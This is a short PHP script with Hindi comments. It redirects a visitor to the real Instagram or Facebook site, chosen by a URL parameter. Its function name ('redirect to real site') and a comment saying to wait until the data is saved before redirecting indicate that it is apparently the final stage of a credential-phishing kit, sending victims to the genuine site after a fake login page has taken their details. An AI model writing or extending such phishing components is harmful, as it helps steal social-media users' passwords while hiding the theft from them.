<?php
function redirectToRealSite($platform) {
    $sites = [
        'instagram' => 'https://www.instagram.com/',
        'facebook' => 'https://www.facebook.com/'
    ];
    
    $url = $sites[$platform] ?? 'https://www.google.com/';
    
    // थोड़ी देर रुकें ताकि डेटा सेव हो जाए
    // फिर रीडायरेक्ट करें
    header("Location: $url");
    exit;
}

// अगर सीधे एक्सेस किया जाए
if (basename(__FILE__) == basename($_SERVER['SCRIPT_FILENAME'])) {
    redirectToRealSite($_GET['platform'] ?? '');
}
?>
